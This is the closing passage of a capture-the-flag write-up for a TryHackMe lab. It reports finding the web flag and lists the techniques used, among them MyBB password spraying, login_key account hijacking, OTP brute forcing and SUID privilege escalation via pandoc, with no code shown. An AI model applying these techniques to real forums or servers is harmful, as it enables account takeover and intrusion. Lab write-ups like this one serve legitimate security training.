![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230127071330.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230127071412.png)

We found the web flag in "Administrator Notes"!!

# Conclusion

What we've learned:

1. Enumerating MyBB
2. Enumerating Usernames Via Incremental UID
3. MyBB Login Password Spraying
4. Cracking GPG Encrypted File's Passphrase
5. Enumerating Exposed MySQL Port
6. MyBB Account Hijacking Via `login_key`
7. Brute Forcing Custom OTP (One-Time Password)
8. Vertical Privilege Escalation Via SUID Sticky Bit In `pandoc` Binary